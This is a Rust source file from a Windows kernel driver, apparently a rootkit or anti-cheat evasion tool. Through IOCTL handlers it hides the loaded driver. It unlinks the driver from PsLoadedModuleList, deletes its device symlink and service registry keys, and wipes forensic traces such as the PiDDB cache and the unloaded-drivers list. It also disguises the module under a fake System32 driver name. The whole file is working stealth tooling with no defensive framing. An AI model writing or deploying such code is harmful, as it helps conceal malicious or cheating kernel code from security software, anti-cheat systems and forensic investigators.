//! Orchestrates driver stealth: module unlink, device symlink, registry, traces.

use core::sync::atomic::{AtomicUsize, Ordering};

use shared_contract::{
    CamouflageRequest, CamouflageResponse, HideRequest, HideResponse, CAMOUFLAGE_FLAG_ALL,
    CAMOUFLAGE_FLAG_BASE_DLL_NAME, CAMOUFLAGE_FLAG_DRIVER_OBJECT_NAME,
    CAMOUFLAGE_FLAG_FULL_DLL_NAME, CAMOUFLAGE_BASE_NAME_MAX, CAMOUFLAGE_DRIVER_NAME_MAX,
    CAMOUFLAGE_FULL_PATH_MAX, HIDE_FLAG_CLEAR_TRACES, HIDE_FLAG_DEVICE_SYMLINK,
    HIDE_FLAG_EPT_MEMORY, HIDE_FLAG_PS_LOADED_MODULE, HIDE_FLAG_REGISTRY,
    HIDE_SERVICE_NAME_MAX, CLEAR_TRACE_DRIVER_NAME_MAX,
};
use wdk_sys::DRIVER_OBJECT;

static DRIVER_PTR: AtomicUsize = AtomicUsize::new(0);

/// Records the driver object for later stealth operations.
pub(crate) fn register_driver_context(driver: &mut DRIVER_OBJECT, _pool_base: *mut u8) {
    DRIVER_PTR.store(driver as *mut _ as usize, Ordering::Release);
    crate::eprintln!(
        "stealth: register driver={driver:p} DriverSection={:p}",
        driver.DriverSection
    );
}

/// Applies stealth stages selected by `request.flags`.
pub(crate) fn apply(request: &HideRequest) -> HideResponse {
    let service = c_str_to_str(&request.service_name, HIDE_SERVICE_NAME_MAX);
    let driver_name = c_str_to_str(&request.driver_name, CLEAR_TRACE_DRIVER_NAME_MAX);

    crate::eprintln!("stealth: ========== IOCTL_HIDE begin ==========");
    crate::eprintln!(
        "stealth: flags={:#x} (module={} symlink={} registry={} traces={} ept={})",
        request.flags,
        flag_on(request.flags, HIDE_FLAG_PS_LOADED_MODULE),
        flag_on(request.flags, HIDE_FLAG_DEVICE_SYMLINK),
        flag_on(request.flags, HIDE_FLAG_REGISTRY),
        flag_on(request.flags, HIDE_FLAG_CLEAR_TRACES),
        flag_on(request.flags, HIDE_FLAG_EPT_MEMORY),
    );
    crate::eprintln!(
        "stealth: service={} driver={} stamp={:#x}",
        service.unwrap_or("<invalid>"),
        driver_name.unwrap_or("<invalid>"),
        request.stamp,
    );

    let mut response = HideResponse::default();

    if (request.flags & HIDE_FLAG_PS_LOADED_MODULE) != 0 {
        crate::eprintln!("stealth: --- stage 1/4 PsLoadedModuleList ---");
        let driver = DRIVER_PTR.load(Ordering::Acquire) as *mut DRIVER_OBJECT;
        crate::eprintln!("stealth: DRIVER_PTR={driver:p}");
        let module = kernel_stealth::hide_driver_module(driver);
        response.ps_loaded_module = u8::from(module.unlinked);
        crate::eprintln!(
            "stealth: stage 1 result unlinked={}",
            response.ps_loaded_module
        );
    }

    if (request.flags & HIDE_FLAG_DEVICE_SYMLINK) != 0 {
        crate::eprintln!("stealth: --- stage 2/4 device symlink ---");
        let ok = crate::device::delete_user_symlink();
        response.device_symlink = u8::from(ok);
        crate::eprintln!("stealth: stage 2 result symlink_deleted={ok}");
    }

    if (request.flags & HIDE_FLAG_REGISTRY) != 0 {
        crate::eprintln!("stealth: --- stage 3/4 registry ---");
        if let Some(service_name) = service {
            let registry = kernel_stealth::delete_service_registry(service_name);
            response.service_registry = u8::from(registry.service_key);
            response.legacy_enum_registry = u8::from(registry.legacy_enum_key);
            crate::eprintln!(
                "stealth: stage 3 result service_key={} legacy_enum={}",
                response.service_registry,
                response.legacy_enum_registry
            );
        } else {
            crate::eprintln!("stealth: stage 3 skip invalid service_name");
        }
    }

    if (request.flags & HIDE_FLAG_CLEAR_TRACES) != 0 {
        crate::eprintln!("stealth: --- stage 4/4 clear traces ---");
        if let Some(name) = driver_name {
            crate::eprintln!("stealth: clear_traces name={name} stamp={:#x}", request.stamp);
            let traces = kernel_trace::clear_driver_traces(name, request.stamp);
            response.piddb = u8::from(traces.piddb);
            response.unloaded = u8::from(traces.unloaded);
            response.hash_bucket = u8::from(traces.hash_bucket);
            response.ci_ea_cache = u8::from(traces.ci_ea_cache);
            crate::eprintln!(
                "stealth: stage 4 result piddb={} unloaded={} hash={} ci_ea={}",
                response.piddb,
                response.unloaded,
                response.hash_bucket,
                response.ci_ea_cache,
            );
        } else {
            crate::eprintln!("stealth: stage 4 skip invalid driver_name");
        }
    }

    if (request.flags & HIDE_FLAG_EPT_MEMORY) != 0 {
        crate::eprintln!("stealth: EPT memory hide disabled (flag ignored)");
    }

    response.success = u8::from(
        response.ps_loaded_module != 0
            || response.device_symlink != 0
            || response.service_registry != 0
            || response.legacy_enum_registry != 0
            || response.piddb != 0
            || response.unloaded != 0
            || response.hash_bucket != 0
            || response.ci_ea_cache != 0,
    );

    crate::eprintln!(
        "stealth: ========== IOCTL_HIDE end success={} module={} symlink={} svc={} legacy={} piddb={} unloaded={} hash={} ci={} ==========",
        response.success,
        response.ps_loaded_module,
        response.device_symlink,
        response.service_registry,
        response.legacy_enum_registry,
        response.piddb,
        response.unloaded,
        response.hash_bucket,
        response.ci_ea_cache,
    );

    response
}

/// Applies post-load module name camouflage selected by `request.flags`.
pub(crate) fn apply_camouflage(request: &CamouflageRequest) -> CamouflageResponse {
    let base_name = c_str_to_str(&request.base_name, CAMOUFLAGE_BASE_NAME_MAX);
    let full_path = c_str_to_str(&request.full_path, CAMOUFLAGE_FULL_PATH_MAX);
    let driver_name = c_str_to_str(&request.driver_name, CAMOUFLAGE_DRIVER_NAME_MAX);

    crate::eprintln!("stealth: ========== IOCTL_CAMOUFLAGE begin ==========");
    crate::eprintln!(
        "stealth: flags={:#x} (base={} full={} driver_obj={})",
        request.flags,
        flag_on(request.flags, CAMOUFLAGE_FLAG_BASE_DLL_NAME),
        flag_on(request.flags, CAMOUFLAGE_FLAG_FULL_DLL_NAME),
        flag_on(request.flags, CAMOUFLAGE_FLAG_DRIVER_OBJECT_NAME),
    );

    let mut response = CamouflageResponse::default();
    let Some(base_name) = base_name else {
        crate::eprintln!("stealth: camouflage invalid base_name");
        return response;
    };

    let flags = if request.flags == 0 {
        CAMOUFLAGE_FLAG_ALL
    } else {
        request.flags
    };

    let full_path_owned;
    let full_path = match full_path {
        Some(path) if !path.is_empty() => path,
        _ => {
            full_path_owned = default_full_path(base_name);
            &full_path_owned
        }
    };

    let driver_name_owned;
    let driver_name = match driver_name {
        Some(name) if !name.is_empty() => name,
        _ => {
            driver_name_owned = default_driver_name(base_name);
            &driver_name_owned
        }
    };

    crate::eprintln!(
        "stealth: base={base_name} full={full_path} driver_obj={driver_name}"
    );

    let driver = DRIVER_PTR.load(Ordering::Acquire) as *mut DRIVER_OBJECT;
    let result = kernel_stealth::camouflage_driver_module(
        driver,
        base_name,
        full_path,
        driver_name,
        flag_on(flags, CAMOUFLAGE_FLAG_BASE_DLL_NAME),
        flag_on(flags, CAMOUFLAGE_FLAG_FULL_DLL_NAME),
        flag_on(flags, CAMOUFLAGE_FLAG_DRIVER_OBJECT_NAME),
    );

    response.base_dll_name = u8::from(result.base_dll_name);
    response.full_dll_name = u8::from(result.full_dll_name);
    response.driver_object_name = u8::from(result.driver_object_name);
    response.success = u8::from(
        result.base_dll_name || result.full_dll_name || result.driver_object_name,
    );

    if result.module_not_linked {
        crate::eprintln!("stealth: camouflage failed module not linked (run before hide?)");
    }

    crate::eprintln!(
        "stealth: ========== IOCTL_CAMOUFLAGE end success={} base={} full={} obj={} ==========",
        response.success,
        response.base_dll_name,
        response.full_dll_name,
        response.driver_object_name,
    );

    response
}

fn default_full_path(base_name: &str) -> alloc::string::String {
    alloc::format!(r"\SystemRoot\System32\drivers\{base_name}")
}

fn default_driver_name(base_name: &str) -> alloc::string::String {
    let stem = base_name
        .strip_suffix(".sys")
        .or_else(|| base_name.strip_suffix(".SYS"))
        .unwrap_or(base_name);
    alloc::string::String::from(stem)
}

fn flag_on(flags: u32, bit: u32) -> bool {
    (flags & bit) != 0
}

fn c_str_to_str(bytes: &[u8], max: usize) -> Option<&str> {
    let end = bytes.iter().position(|&b| b == 0).unwrap_or(bytes.len());
    if end == 0 || end > max {
        return None;
    }
    core::str::from_utf8(&bytes[..end]).ok()
}
